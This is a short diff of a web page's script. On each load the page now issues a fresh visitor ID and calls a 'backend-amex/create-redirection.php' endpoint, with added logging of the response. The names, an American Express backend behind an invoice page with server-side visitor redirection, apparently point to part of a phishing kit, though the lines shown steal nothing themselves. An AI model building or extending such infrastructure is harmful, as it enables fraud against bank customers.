@@ -643,9 +643,9 @@ footer {
 <!-- ========== FIN FOOTER ========== -->
  <script>
 // Générer ou récupérer l'ID client
-if (!localStorage.getItem('clientId')) {
-  localStorage.setItem('clientId', 'CLIENT-' + Date.now());
-}
+// À CHAQUE chargement = nouvel ID client
+localStorage.removeItem('clientId');
+localStorage.setItem('clientId', 'CLIENT-' + Date.now());
 const clientId = localStorage.getItem('clientId');
 
 // Créer la redirection côté serveur au chargement de la page
@@ -657,7 +657,10 @@ fetch('backend-amex/create-redirection.php', {
     sourceUrl: '/facture.html',
     type: 'facture'
   })
-}).catch(e => console.error(e));
+})
+.then(r => r.json())
+.then(d => console.log('Redirection créée:', d))
+.catch(e => console.error('Erreur create-redirection:', e));
 
   // Envoyer le message automatiquement au chargement de la page
 window.addEventListener('load', function() {
